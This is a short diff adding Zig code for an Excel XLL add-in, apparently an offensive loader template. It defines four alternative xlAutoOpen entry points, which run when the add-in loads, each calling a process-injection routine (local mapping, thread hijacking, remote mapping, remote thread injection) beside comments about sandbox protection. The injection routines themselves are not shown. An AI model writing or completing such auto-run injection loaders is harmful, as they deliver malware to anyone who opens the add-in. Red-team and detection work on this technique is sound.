@@ -1,0 +1,32 @@
+// LOCAL MAPPING INJECTION 
+pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+    // Sandbox protection option enabled? 
+    local_map_injection();
+    return 1;
+}
+// END OF LOCAL MAPPING INJECTION 
+
+
+// HIJACK THREAD INJECTION 
+pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+   // Sandbox protection option enabled? 
+    createThreadAndExecute(sampleProcedure);
+    return 1;
+}
+// END OF HIJACK THREAD INJECTION 
+
+// REMOTE MAPPING INJECTION 
+pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+    // Sandbox protection option enabled? 
+    remote_map_injection();
+    return 1;
+}
+// END OF REMOTE MAPPING INJECTION  
+
+// REMOTE THREAD INJECTION 
+pub export fn xlAutoOpen() callconv(WINAPI) i32 {
+    // Sandbox protection option enabled? 
+    remote_thread_injection();
+    return 1;
+}
+// END OF REMOTE THREAD INJECTION   
